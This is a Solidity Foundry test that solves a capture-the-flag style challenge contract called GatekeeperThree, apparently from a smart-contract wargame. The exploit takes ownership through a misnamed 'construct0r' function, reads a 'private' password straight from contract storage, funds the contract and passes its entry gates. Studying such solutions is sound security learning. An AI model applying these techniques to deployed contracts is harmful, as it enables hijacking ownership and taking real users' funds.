// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/GatekeeperThree.sol";
import "@forge-std/Test.sol";

contract Attack is Test{
    GatekeeperThree public g3Contract;

    constructor() {
        g3Contract = new GatekeeperThree();
    }

    function pwn() public returns(bool ans, address nedded){
        g3Contract.createTrick();
        bytes32 pass = vm.load(address(g3Contract.trick()), bytes32(uint256(2)));
        g3Contract.getAllowance(uint(pass));
        ans = g3Contract.enter();
        nedded = g3Contract.entrant();
    }

    function callConstruct0r() public {
      g3Contract.construct0r();
    }
}

contract GatekeeperThreeTest is Test {

    GatekeeperThree public g3;
    address public attacker;
    function setUp() public {
        attacker = vm.addr(1);
        vm.deal(attacker, 1 ether);
    }

    function testExploit() public {
        vm.startPrank(attacker, attacker); // setting address and tx.origin
        Attack attack = new Attack();
        address g3Address = address(attack.g3Contract());
        attack.callConstruct0r();
        assertEq(GatekeeperThree(attack.g3Contract()).owner(), address(attack));
        (bool success,) = payable(g3Address).call{value: 0.002 ether}("");
        require(success, "failed");
        assert(g3Address.balance == 0.002 ether);
        (bool result, address ned) = attack.pwn();
        vm.stopPrank();
        assert(result == true);
        assertEq(GatekeeperThree(attack.g3Contract()).entrant(), attacker);
    }
}